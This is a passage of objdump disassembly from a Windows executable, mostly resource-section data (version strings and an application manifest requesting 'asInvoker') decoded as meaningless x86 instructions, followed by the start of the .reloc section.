  40c0b6:	dec    edi
  40c0b7:	add    BYTE PTR [esi+0x0],cl
  40c0ba:	pop    edi
  40c0bb:	add    BYTE PTR [ecx+0x0],cl
  40c0be:	dec    esi
  40c0bf:	add    BYTE PTR [esi+0x0],al
  40c0c2:	dec    edi
  40c0c3:	add    BYTE PTR [eax],al
  40c0c5:	add    BYTE PTR [eax],al
  40c0c7:	add    BYTE PTR [ebp+0xfeef04],bh
  40c0cd:	add    BYTE PTR [ecx],al
  40c0cf:	add    BYTE PTR ds:0x1000300,al
  40c0d5:	add    BYTE PTR [ecx],cl
  40c0d7:	js     0x40c0de
  40c0d9:	add    BYTE PTR [ebx],al
  40c0db:	add    BYTE PTR [ecx],al
  40c0dd:	add    BYTE PTR [ecx],cl
  40c0df:	js     0x40c120
  40c0e1:	add    BYTE PTR [eax],al
  40c0e3:	add    BYTE PTR [eax],cl
  40c0e5:	add    BYTE PTR [eax],al
  40c0e7:	add    BYTE PTR [eax+eax*1],al
  40c0ea:	add    BYTE PTR [eax],al
  40c0ec:	add    DWORD PTR [eax],eax
	...
  40c0fa:	add    BYTE PTR [eax],al
  40c0fc:	bound  eax,QWORD PTR [ebx]
  40c0fe:	add    BYTE PTR [eax],al
  40c100:	add    DWORD PTR [eax],eax
  40c102:	push   ebx
  40c103:	add    BYTE PTR [eax+eax*1+0x72],dh
  40c107:	add    BYTE PTR [ecx+0x0],ch
  40c10a:	outs   dx,BYTE PTR ds:[esi]
  40c10b:	add    BYTE PTR [edi+0x0],ah
  40c10e:	inc    esi
  40c10f:	add    BYTE PTR [ecx+0x0],ch
  40c112:	ins    BYTE PTR es:[edi],dx
  40c113:	add    BYTE PTR [ebp+0x0],ah
  40c116:	dec    ecx
  40c117:	add    BYTE PTR [esi+0x0],ch
  40c11a:	data16 add BYTE PTR [edi+0x0],ch
  40c11e:	add    BYTE PTR [eax],al
  40c120:	add    eax,DWORD PTR ds:[eax]
  40c123:	add    BYTE PTR [ecx],al
  40c125:	add    BYTE PTR [eax],dh
  40c127:	add    BYTE PTR [eax+eax*1],dh
  40c12a:	xor    BYTE PTR [eax],al
  40c12c:	cmp    DWORD PTR [eax],eax
  40c12e:	xor    BYTE PTR [eax],al
  40c130:	xor    al,0x0
  40c132:	inc    edx
  40c133:	add    BYTE PTR [eax],dh
  40c135:	add    BYTE PTR [eax],al
  40c137:	add    BYTE PTR [eax+eax*1+0x16],cl
  40c13b:	add    BYTE PTR [ecx],al
  40c13d:	add    BYTE PTR [ebx+0x0],al
  40c140:	outs   dx,DWORD PTR ds:[esi]
  40c141:	add    BYTE PTR [ebp+0x0],ch
  40c144:	jo     0x40c146
  40c146:	popa   
  40c147:	add    BYTE PTR [esi+0x0],ch
  40c14a:	jns    0x40c14c
  40c14c:	dec    esi
  40c14d:	add    BYTE PTR [ecx+0x0],ah
  40c150:	ins    DWORD PTR es:[edi],dx
  40c151:	add    BYTE PTR [ebp+0x0],ah
  40c154:	add    BYTE PTR [eax],al
  40c156:	add    BYTE PTR [eax],al
  40c158:	dec    ebp
  40c159:	add    BYTE PTR [ecx+0x0],ch
  40c15c:	arpl   WORD PTR [eax],ax
  40c15e:	jb     0x40c160
  40c160:	outs   dx,DWORD PTR ds:[esi]
  40c161:	add    BYTE PTR [ebx+0x0],dh
  40c164:	outs   dx,DWORD PTR ds:[esi]
  40c165:	add    BYTE PTR [esi+0x0],ah
  40c168:	je     0x40c16a
  40c16a:	and    BYTE PTR [eax],al
  40c16c:	inc    ebx
  40c16d:	add    BYTE PTR [edi+0x0],ch
  40c170:	jb     0x40c172
  40c172:	jo     0x40c174
  40c174:	outs   dx,DWORD PTR ds:[esi]
  40c175:	add    BYTE PTR [edx+0x0],dh
  40c178:	popa   
  40c179:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c17d:	add    BYTE PTR [edi+0x0],ch
  40c180:	outs   dx,BYTE PTR ds:[esi]
  40c181:	add    BYTE PTR [eax],al
  40c183:	add    BYTE PTR [eax+eax*1+0x10032],cl
  40c18a:	inc    esi
  40c18b:	add    BYTE PTR [ecx+0x0],ch
  40c18e:	ins    BYTE PTR es:[edi],dx
  40c18f:	add    BYTE PTR [ebp+0x0],ah
  40c192:	inc    esp
  40c193:	add    BYTE PTR [ebp+0x0],ah
  40c196:	jae    0x40c198
  40c198:	arpl   WORD PTR [eax],ax
  40c19a:	jb     0x40c19c
  40c19c:	imul   eax,DWORD PTR [eax],0x740070
  40c1a2:	imul   eax,DWORD PTR [eax],0x6e006f
  40c1a8:	add    BYTE PTR [eax],al
  40c1aa:	add    BYTE PTR [eax],al
  40c1ac:	dec    ebp
  40c1ad:	add    BYTE PTR [ecx+0x0],ch
  40c1b0:	arpl   WORD PTR [eax],ax
  40c1b2:	jb     0x40c1b4
  40c1b4:	outs   dx,DWORD PTR ds:[esi]
  40c1b5:	add    BYTE PTR [ebx+0x0],dh
  40c1b8:	outs   dx,DWORD PTR ds:[esi]
  40c1b9:	add    BYTE PTR [esi+0x0],ah
  40c1bc:	je     0x40c1be
  40c1be:	and    BYTE PTR [eax],al
  40c1c0:	add    BYTE PTR cs:[esi+0x0],cl
  40c1c4:	inc    ebp
  40c1c5:	add    BYTE PTR [eax+eax*1+0x20],dl
  40c1c9:	add    BYTE PTR [ecx+0x0],al
  40c1cc:	jae    0x40c1ce
  40c1ce:	jae    0x40c1d0
  40c1d0:	add    BYTE PTR gs:[ebp+0x0],ch
  40c1d4:	bound  eax,QWORD PTR [eax]
  40c1d6:	ins    BYTE PTR es:[edi],dx
  40c1d7:	add    BYTE PTR [ecx+0x0],bh
  40c1da:	and    BYTE PTR [eax],al
  40c1dc:	je     0x40c1de
  40c1de:	outs   dx,DWORD PTR ds:[esi]
  40c1df:	add    BYTE PTR [eax],ah
  40c1e1:	add    BYTE PTR [eax+eax*1+0x79],dl
  40c1e5:	add    BYTE PTR [eax+0x0],dh
  40c1e8:	add    BYTE PTR gs:[eax],ah
  40c1eb:	add    BYTE PTR [eax+eax*1+0x69],cl
  40c1ef:	add    BYTE PTR [edx+0x0],ah
  40c1f2:	jb     0x40c1f4
  40c1f4:	popa   
  40c1f5:	add    BYTE PTR [edx+0x0],dh
  40c1f8:	jns    0x40c1fa
  40c1fa:	and    BYTE PTR [eax],al
  40c1fc:	inc    ebx
  40c1fd:	add    BYTE PTR [edi+0x0],ch
  40c200:	outs   dx,BYTE PTR ds:[esi]
  40c201:	add    BYTE PTR [esi+0x0],dh
  40c204:	add    BYTE PTR gs:[edx+0x0],dh
  40c208:	je     0x40c20a
  40c20a:	add    BYTE PTR gs:[edx+0x0],dh
  40c20e:	add    BYTE PTR [eax],al
  40c210:	pop    edx
  40c211:	add    BYTE PTR ds:0x46000100,bl
  40c217:	add    BYTE PTR [ecx+0x0],ch
  40c21a:	ins    BYTE PTR es:[edi],dx
  40c21b:	add    BYTE PTR [ebp+0x0],ah
  40c21e:	push   esi
  40c21f:	add    BYTE PTR [ebp+0x0],ah
  40c222:	jb     0x40c224
  40c224:	jae    0x40c226
  40c226:	imul   eax,DWORD PTR [eax],0x6e006f
  40c22c:	add    BYTE PTR [eax],al
  40c22e:	add    BYTE PTR [eax],al
  40c230:	xor    eax,DWORD PTR [eax]
  40c232:	add    BYTE PTR cs:0x33002e00,dh
  40c239:	add    BYTE PTR [eax],dh
  40c23b:	add    BYTE PTR [edi],dh
  40c23d:	add    BYTE PTR [edx],dh
  40c23f:	add    BYTE PTR [ecx],bh
  40c241:	add    BYTE PTR [esi],ch
  40c243:	add    BYTE PTR [ecx],dh
  40c245:	add    BYTE PTR [eax],ah
  40c247:	add    BYTE PTR [eax],ch
  40c249:	add    BYTE PTR [ebx+0x0],dl
  40c24c:	push   eax
  40c24d:	add    BYTE PTR [esi],ch
  40c24f:	add    BYTE PTR [eax],dh
  40c251:	add    BYTE PTR [ebx],dh
  40c253:	add    BYTE PTR [eax],dh
  40c255:	add    BYTE PTR [edi],dh
  40c257:	add    BYTE PTR [edx],dh
  40c259:	add    BYTE PTR [ecx],bh
  40c25b:	add    BYTE PTR ds:0x31003000,ch
  40c261:	add    BYTE PTR [eax],dh
  40c263:	add    BYTE PTR [eax],dh
  40c265:	add    BYTE PTR [ecx],ch
  40c267:	add    BYTE PTR [eax],al
  40c269:	add    BYTE PTR [eax],al
  40c26b:	add    BYTE PTR [esi],dh
  40c26d:	add    BYTE PTR [ebx],cl
  40c26f:	add    BYTE PTR [ecx],al
  40c271:	add    BYTE PTR [ecx+0x0],cl
  40c274:	outs   dx,BYTE PTR ds:[esi]
  40c275:	add    BYTE PTR [eax+eax*1+0x65],dh
  40c279:	add    BYTE PTR [edx+0x0],dh
  40c27c:	outs   dx,BYTE PTR ds:[esi]
  40c27d:	add    BYTE PTR [ecx+0x0],ah
  40c280:	ins    BYTE PTR es:[edi],dx
  40c281:	add    BYTE PTR [esi+0x0],cl
  40c284:	popa   
  40c285:	add    BYTE PTR [ebp+0x0],ch
  40c288:	add    BYTE PTR gs:[eax],al
  40c28b:	add    BYTE PTR [eax+eax*1+0x6c],dl
  40c28f:	add    BYTE PTR [edx+0x0],ah
  40c292:	inc    ebp
  40c293:	add    BYTE PTR [eax+0x0],bh
  40c296:	jo     0x40c298
  40c298:	add    BYTE PTR cs:[ebp+0x0],ah
  40c29c:	js     0x40c29e
  40c29e:	add    BYTE PTR gs:[eax],al
  40c2a1:	add    BYTE PTR [eax],al
  40c2a3:	add    BYTE PTR [edx+0x1002f00],al
  40c2a9:	add    BYTE PTR [eax+eax*1+0x65],cl
  40c2ad:	add    BYTE PTR [edi+0x0],ah
  40c2b0:	popa   
  40c2b1:	add    BYTE PTR [eax+eax*1+0x43],ch
  40c2b5:	add    BYTE PTR [edi+0x0],ch
  40c2b8:	jo     0x40c2ba
  40c2ba:	jns    0x40c2bc
  40c2bc:	jb     0x40c2be
  40c2be:	imul   eax,DWORD PTR [eax],0x680067
  40c2c4:	je     0x40c2c6
  40c2c6:	add    BYTE PTR [eax],al
  40c2c8:	test   eax,0x4d002000
  40c2cd:	add    BYTE PTR [ecx+0x0],ch
  40c2d0:	arpl   WORD PTR [eax],ax
  40c2d2:	jb     0x40c2d4
  40c2d4:	outs   dx,DWORD PTR ds:[esi]
  40c2d5:	add    BYTE PTR [ebx+0x0],dh
  40c2d8:	outs   dx,DWORD PTR ds:[esi]
  40c2d9:	add    BYTE PTR [esi+0x0],ah
  40c2dc:	je     0x40c2de
  40c2de:	and    BYTE PTR [eax],al
  40c2e0:	inc    ebx
  40c2e1:	add    BYTE PTR [edi+0x0],ch
  40c2e4:	jb     0x40c2e6
  40c2e6:	jo     0x40c2e8
  40c2e8:	outs   dx,DWORD PTR ds:[esi]
  40c2e9:	add    BYTE PTR [edx+0x0],dh
  40c2ec:	popa   
  40c2ed:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c2f1:	add    BYTE PTR [edi+0x0],ch
  40c2f4:	outs   dx,BYTE PTR ds:[esi]
  40c2f5:	add    BYTE PTR [esi],ch
  40c2f7:	add    BYTE PTR [eax],ah
  40c2f9:	add    BYTE PTR [eax],ah
  40c2fb:	add    BYTE PTR [ecx+0x0],al
  40c2fe:	ins    BYTE PTR es:[edi],dx
  40c2ff:	add    BYTE PTR [eax+eax*1+0x20],ch
  40c303:	add    BYTE PTR [edx+0x0],dh
  40c306:	imul   eax,DWORD PTR [eax],0x680067
  40c30c:	je     0x40c30e
  40c30e:	jae    0x40c310
  40c310:	and    BYTE PTR [eax],al
  40c312:	jb     0x40c314
  40c314:	add    BYTE PTR gs:[ebx+0x0],dh
  40c318:	add    BYTE PTR gs:[edx+0x0],dh
  40c31c:	jbe    0x40c31e
  40c31e:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40c323:	add    BYTE PTR [eax],al
  40c325:	add    BYTE PTR [eax],al
  40c327:	add    BYTE PTR [esi],bh
  40c329:	add    BYTE PTR [ebx],cl
  40c32b:	add    BYTE PTR [ecx],al
  40c32d:	add    BYTE PTR [edi+0x0],cl
  40c330:	jb     0x40c332
  40c332:	imul   eax,DWORD PTR [eax],0x690067
  40c338:	outs   dx,BYTE PTR ds:[esi]
  40c339:	add    BYTE PTR [ecx+0x0],ah
  40c33c:	ins    BYTE PTR es:[edi],dx
  40c33d:	add    BYTE PTR [esi+0x0],al
  40c340:	imul   eax,DWORD PTR [eax],0x65006c
  40c346:	outs   dx,BYTE PTR ds:[esi]
  40c347:	add    BYTE PTR [ecx+0x0],ah
  40c34a:	ins    DWORD PTR es:[edi],dx
  40c34b:	add    BYTE PTR [ebp+0x0],ah
  40c34e:	add    BYTE PTR [eax],al
  40c350:	push   esp
  40c351:	add    BYTE PTR [eax+eax*1+0x62],ch
  40c355:	add    BYTE PTR [ebp+0x0],al
  40c358:	js     0x40c35a
  40c35a:	jo     0x40c35c
  40c35c:	add    BYTE PTR cs:[ebp+0x0],ah
  40c360:	js     0x40c362
  40c362:	add    BYTE PTR gs:[eax],al
  40c365:	add    BYTE PTR [eax],al
  40c367:	add    BYTE PTR [eax+eax*1+0x1a],dl
  40c36b:	add    BYTE PTR [ecx],al
  40c36d:	add    BYTE PTR [eax+0x0],dl
  40c370:	jb     0x40c372
  40c372:	outs   dx,DWORD PTR ds:[esi]
  40c373:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c377:	add    BYTE PTR [ebx+0x0],ah
  40c37a:	je     0x40c37c
  40c37c:	dec    esi
  40c37d:	add    BYTE PTR [ecx+0x0],ah
  40c380:	ins    DWORD PTR es:[edi],dx
  40c381:	add    BYTE PTR [ebp+0x0],ah
  40c384:	add    BYTE PTR [eax],al
  40c386:	add    BYTE PTR [eax],al
  40c388:	dec    ebp
  40c389:	add    BYTE PTR [ecx+0x0],ch
  40c38c:	arpl   WORD PTR [eax],ax
  40c38e:	jb     0x40c390
  40c390:	outs   dx,DWORD PTR ds:[esi]
  40c391:	add    BYTE PTR [ebx+0x0],dh
  40c394:	outs   dx,DWORD PTR ds:[esi]
  40c395:	add    BYTE PTR [esi+0x0],ah
  40c398:	je     0x40c39a
  40c39a:	scas   al,BYTE PTR es:[edi]
  40c39b:	add    BYTE PTR [eax],ah
  40c39d:	add    BYTE PTR [esi],ch
  40c39f:	add    BYTE PTR [esi+0x0],cl
  40c3a2:	inc    ebp
  40c3a3:	add    BYTE PTR [eax+eax*1+0x20],dl
  40c3a7:	add    BYTE PTR [esi+0x0],al
  40c3aa:	jb     0x40c3ac
  40c3ac:	popa   
  40c3ad:	add    BYTE PTR [ebp+0x0],ch
  40c3b0:	add    BYTE PTR gs:[edi+0x0],dh
  40c3b4:	outs   dx,DWORD PTR ds:[esi]
  40c3b5:	add    BYTE PTR [edx+0x0],dh
  40c3b8:	imul   eax,DWORD PTR [eax],0x0
  40c3bb:	add    BYTE PTR [eax+eax*1],bh
  40c3be:	or     al,0x0
  40c3c0:	add    DWORD PTR [eax],eax
  40c3c2:	push   eax
  40c3c3:	add    BYTE PTR [edx+0x0],dh
  40c3c6:	outs   dx,DWORD PTR ds:[esi]
  40c3c7:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c3cb:	add    BYTE PTR [ebx+0x0],ah
  40c3ce:	je     0x40c3d0
  40c3d0:	push   esi
  40c3d1:	add    BYTE PTR [ebp+0x0],ah
  40c3d4:	jb     0x40c3d6
  40c3d6:	jae    0x40c3d8
  40c3d8:	imul   eax,DWORD PTR [eax],0x6e006f
  40c3de:	add    BYTE PTR [eax],al
  40c3e0:	xor    eax,DWORD PTR [eax]
  40c3e2:	add    BYTE PTR cs:0x33002e00,dh
  40c3e9:	add    BYTE PTR [eax],dh
  40c3eb:	add    BYTE PTR [edi],dh
  40c3ed:	add    BYTE PTR [edx],dh
  40c3ef:	add    BYTE PTR [ecx],bh
  40c3f1:	add    BYTE PTR [esi],ch
  40c3f3:	add    BYTE PTR [ecx],dh
  40c3f5:	add    BYTE PTR [eax],al
  40c3f7:	add    BYTE PTR [eax+eax*1],dh
  40c3fa:	push   cs
  40c3fb:	add    BYTE PTR [ecx],al
  40c3fd:	add    BYTE PTR [ebx+0x0],al
  40c400:	outs   dx,DWORD PTR ds:[esi]
  40c401:	add    BYTE PTR [ebp+0x0],ch
  40c404:	ins    DWORD PTR es:[edi],dx
  40c405:	add    BYTE PTR [ebp+0x0],ah
  40c408:	outs   dx,BYTE PTR ds:[esi]
  40c409:	add    BYTE PTR [eax+eax*1+0x73],dh
  40c40d:	add    BYTE PTR [eax],al
  40c40f:	add    BYTE PTR [esi+0x0],al
  40c412:	ins    BYTE PTR es:[edi],dx
  40c413:	add    BYTE PTR [ecx+0x0],ah
  40c416:	jbe    0x40c418
  40c418:	outs   dx,DWORD PTR ds:[esi]
  40c419:	add    BYTE PTR [edx+0x0],dh
  40c41c:	cmp    eax,0x65005200
  40c421:	add    BYTE PTR [eax+eax*1+0x61],dh
  40c425:	add    BYTE PTR [ecx+0x0],ch
  40c428:	ins    BYTE PTR es:[edi],dx
  40c429:	add    BYTE PTR [eax],al
  40c42b:	add    BYTE PTR [edx],dh
  40c42d:	add    BYTE PTR [ecx],cl
  40c42f:	add    BYTE PTR [ecx],al
  40c431:	add    BYTE PTR [eax+0x0],dl
  40c434:	jb     0x40c436
  40c436:	imul   eax,DWORD PTR [eax],0x610076
  40c43c:	je     0x40c43e
  40c43e:	add    BYTE PTR gs:[edx+0x0],al
  40c442:	jne    0x40c444
  40c444:	imul   eax,DWORD PTR [eax],0x64006c
  40c44a:	add    BYTE PTR [eax],al
  40c44c:	inc    esp
  40c44d:	add    BYTE PTR [eax+eax*1+0x42],al
  40c451:	add    BYTE PTR [eax+eax*1+0x44],cl
  40c455:	add    BYTE PTR [edx],dh
  40c457:	add    BYTE PTR [ecx],dh
  40c459:	add    BYTE PTR [ecx],dh
  40c45b:	add    BYTE PTR [eax],al
  40c45d:	add    BYTE PTR [eax],al
  40c45f:	add    BYTE PTR [eax+eax*1+0x0],al
  40c463:	add    BYTE PTR [ecx],al
  40c465:	add    BYTE PTR [esi+0x0],dl
  40c468:	popa   
  40c469:	add    BYTE PTR [edx+0x0],dh
  40c46c:	inc    esi
  40c46d:	add    BYTE PTR [ecx+0x0],ch
  40c470:	ins    BYTE PTR es:[edi],dx
  40c471:	add    BYTE PTR [ebp+0x0],ah
  40c474:	dec    ecx
  40c475:	add    BYTE PTR [esi+0x0],ch
  40c478:	data16 add BYTE PTR [edi+0x0],ch
  40c47c:	add    BYTE PTR [eax],al
  40c47e:	add    BYTE PTR [eax],al
  40c480:	and    al,0x0
  40c482:	add    al,0x0
  40c484:	add    BYTE PTR [eax],al
  40c486:	push   esp
  40c487:	add    BYTE PTR [edx+0x0],dh
  40c48a:	popa   
  40c48b:	add    BYTE PTR [esi+0x0],ch
  40c48e:	jae    0x40c490
  40c490:	ins    BYTE PTR es:[edi],dx
  40c491:	add    BYTE PTR [ecx+0x0],ah
  40c494:	je     0x40c496
  40c496:	imul   eax,DWORD PTR [eax],0x6e006f
  40c49c:	add    BYTE PTR [eax],al
  40c49e:	add    BYTE PTR [eax],al
  40c4a0:	or     DWORD PTR [eax+esi*4],eax
  40c4a3:	add    al,0x0
  40c4a5:	add    BYTE PTR [eax],al
  40c4a7:	add    BYTE PTR [ecx+eiz*2],bh
  40c4aa:	jae    0x40c51f
  40c4ac:	gs ins DWORD PTR es:[edi],dx
  40c4ae:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40c4b2:	js     0x40c521
  40c4b4:	ins    BYTE PTR es:[edi],dx
  40c4b5:	outs   dx,BYTE PTR ds:[esi]
  40c4b6:	jae    0x40c4f5
  40c4b8:	and    dh,BYTE PTR [ebp+0x72]
  40c4bb:	outs   dx,BYTE PTR ds:[esi]
  40c4bc:	cmp    dh,BYTE PTR [ebx+0x63]
  40c4bf:	push   0x73616d65
  40c4c4:	sub    eax,0x7263696d
  40c4c9:	outs   dx,DWORD PTR ds:[esi]
  40c4ca:	jae    0x40c53b
  40c4cc:	data16 je 0x40c4fc
  40c4cf:	arpl   WORD PTR [edi+0x6d],bp
  40c4d2:	cmp    ah,BYTE PTR [ecx+0x73]
  40c4d5:	ins    DWORD PTR es:[edi],dx
  40c4d6:	cs jbe 0x40c50a
  40c4d9:	and    ah,BYTE PTR [eax]
  40c4db:	ins    DWORD PTR es:[edi],dx
  40c4dc:	popa   
  40c4dd:	outs   dx,BYTE PTR ds:[esi]
  40c4de:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40c4e5:	jb     0x40c55a
  40c4e7:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40c4ee:	xor    BYTE PTR [edx],ah
  40c4f0:	and    BYTE PTR ds:[edx],cl
  40c4f3:	and    BYTE PTR [eax],ah
  40c4f5:	and    BYTE PTR [eax],ah
  40c4f7:	and    BYTE PTR [eax],ah
  40c4f9:	cmp    al,0x74
  40c4fb:	jb     0x40c572
  40c4fd:	jae    0x40c573
  40c4ff:	dec    ecx
  40c500:	outs   dx,BYTE PTR ds:[esi]
  40c501:	outs   dx,WORD PTR ds:[esi]
  40c503:	and    BYTE PTR [eax+0x6d],bh
  40c506:	ins    BYTE PTR es:[edi],dx
  40c507:	outs   dx,BYTE PTR ds:[esi]
  40c508:	jae    0x40c547
  40c50a:	and    dh,BYTE PTR [ebp+0x72]
  40c50d:	outs   dx,BYTE PTR ds:[esi]
  40c50e:	cmp    dh,BYTE PTR [ebx+0x63]
  40c511:	push   0x73616d65
  40c516:	sub    eax,0x7263696d
  40c51b:	outs   dx,DWORD PTR ds:[esi]
  40c51c:	jae    0x40c58d
  40c51e:	data16 je 0x40c54e
  40c521:	arpl   WORD PTR [edi+0x6d],bp
  40c524:	cmp    ah,BYTE PTR [ecx+0x73]
  40c527:	ins    DWORD PTR es:[edi],dx
  40c528:	cs jbe 0x40c55e
  40c52b:	and    bh,BYTE PTR [esi]
  40c52d:	and    BYTE PTR [edx],cl
  40c52f:	and    BYTE PTR [eax],ah
  40c531:	and    BYTE PTR [eax],ah
  40c533:	and    BYTE PTR [eax],ah
  40c535:	and    BYTE PTR [eax],ah
  40c537:	cmp    al,0x73
  40c539:	arpl   WORD PTR gs:[ebp+0x72],si
  40c53d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  40c545:	and    BYTE PTR [eax],ah
  40c547:	and    BYTE PTR [eax],ah
  40c549:	and    BYTE PTR [eax],ah
  40c54b:	and    BYTE PTR [eax],ah
  40c54d:	cmp    al,0x72
  40c54f:	gs jno 0x40c5c7
  40c552:	gs jae 0x40c5c9
  40c555:	gs fs push eax
  40c558:	jb     0x40c5c3
  40c55a:	jbe    0x40c5c5
  40c55c:	ins    BYTE PTR es:[edi],dx
  40c55d:	gs addr16 gs jae 0x40c5a0
  40c562:	and    BYTE PTR [edx],cl
  40c564:	and    BYTE PTR [eax],ah
  40c566:	and    BYTE PTR [eax],ah
  40c568:	and    BYTE PTR [eax],ah
  40c56a:	and    BYTE PTR [eax],ah
  40c56c:	and    BYTE PTR [eax],ah
  40c56e:	and    BYTE PTR [eax],ah
  40c570:	cmp    al,0x72
  40c572:	gs jno 0x40c5ea
  40c575:	gs jae 0x40c5ec
  40c578:	gs fs inc ebp
  40c57b:	js     0x40c5e2
  40c57d:	arpl   WORD PTR [ebp+0x74],si
  40c580:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40c587:	ins    BYTE PTR es:[edi],dx
  40c588:	and    BYTE PTR [edx],cl
  40c58a:	and    BYTE PTR [eax],ah
  40c58c:	and    BYTE PTR [eax],ah
  40c58e:	and    BYTE PTR [eax],ah
  40c590:	and    BYTE PTR [eax],ah
  40c592:	and    BYTE PTR [eax],ah
  40c594:	and    BYTE PTR [eax],ah
  40c596:	and    BYTE PTR [eax],ah
  40c598:	ins    BYTE PTR es:[edi],dx
  40c599:	gs jbe 0x40c601
  40c59c:	ins    BYTE PTR es:[edi],dx
  40c59d:	cmp    eax,0x49736122
  40c5a2:	outs   dx,BYTE PTR ds:[esi]
  40c5a3:	jbe    0x40c614
  40c5a5:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40c5a9:	and    BYTE PTR [edx],cl
  40c5ab:	and    BYTE PTR [eax],ah
  40c5ad:	and    BYTE PTR [eax],ah
  40c5af:	and    BYTE PTR [eax],ah
  40c5b1:	and    BYTE PTR [eax],ah
  40c5b3:	and    BYTE PTR [eax],ah
  40c5b5:	and    BYTE PTR [eax],ah
  40c5b7:	and    BYTE PTR [eax],ah
  40c5b9:	jne    0x40c624
  40c5bb:	inc    ecx
  40c5bc:	arpl   WORD PTR [ebx+0x65],sp
  40c5bf:	jae    0x40c634
  40c5c1:	cmp    eax,0x6c616622
  40c5c6:	jae    0x40c62d
  40c5c8:	and    ch,BYTE PTR [edi]
  40c5ca:	and    BYTE PTR ds:[edx],cl
  40c5cd:	and    BYTE PTR [eax],ah
  40c5cf:	and    BYTE PTR [eax],ah
  40c5d1:	and    BYTE PTR [eax],ah
  40c5d3:	and    BYTE PTR [eax],ah
  40c5d5:	and    BYTE PTR [eax],ah
  40c5d7:	cmp    al,0x2f
  40c5d9:	jb     0x40c640
  40c5db:	jno    0x40c652
  40c5dd:	gs jae 0x40c654
  40c5e0:	gs fs push eax
  40c5e3:	jb     0x40c64e
  40c5e5:	jbe    0x40c650
  40c5e7:	ins    BYTE PTR es:[edi],dx
  40c5e8:	gs addr16 gs jae 0x40c62b
  40c5ed:	and    BYTE PTR [edx],cl
  40c5ef:	and    BYTE PTR [eax],ah
  40c5f1:	and    BYTE PTR [eax],ah
  40c5f3:	and    BYTE PTR [eax],ah
  40c5f5:	and    BYTE PTR [eax],ah
  40c5f7:	cmp    al,0x2f
  40c5f9:	jae    0x40c660
  40c5fb:	arpl   WORD PTR [ebp+0x72],si
  40c5fe:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  40c606:	and    BYTE PTR [eax],ah
  40c608:	and    BYTE PTR [eax],ah
  40c60a:	cmp    al,0x2f
  40c60c:	je     0x40c680
  40c60e:	jne    0x40c683
  40c610:	je     0x40c65b
  40c612:	outs   dx,BYTE PTR ds:[esi]
  40c613:	outs   dx,WORD PTR ds:[esi]
  40c615:	and    BYTE PTR ds:[edx],cl
  40c618:	and    BYTE PTR [eax],ah
  40c61a:	and    BYTE PTR [eax],ah
  40c61c:	cmp    al,0x2f
  40c61e:	popa   
  40c61f:	jae    0x40c694
  40c621:	gs ins DWORD PTR es:[edi],dx
  40c623:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
	...

Disassembly of section .reloc:

0040e000 <.reloc>:
  40e000:	add    BYTE PTR [eax+0xc0000],dh
  40e006:	add    BYTE PTR [eax],al
  40e008:	.byte 0x0
  40e009:	.byte 0x3d
	...
